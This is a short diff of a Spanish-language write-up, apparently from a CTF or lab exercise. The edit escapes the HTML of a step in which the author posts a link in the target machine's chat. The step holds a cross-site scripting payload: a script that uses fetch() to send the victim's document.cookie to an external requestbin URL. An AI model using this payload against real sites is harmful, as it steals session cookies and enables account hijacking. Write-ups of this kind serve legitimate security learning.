@@ -43,8 +43,8 @@ tags:
 
 <div style="height: 5px;"></div>
 
-- después pego el link con un script en el chat de la maquina atacada:
-    "<script>fetch("http://requestbin.whapi.cloud/1kxv70s1?cookie=" + document.cookie);</script>"
+- Después pego el link con un script en el chat de la maquina atacada:
+    <pre><code>&lt;script&gt;fetch(&quot;http://requestbin.whapi.cloud/1kxv70s1?cookie=&quot; + document.cookie);&lt;/script&gt;</code></pre>
 
 <div style="height: 5px;"></div>
 
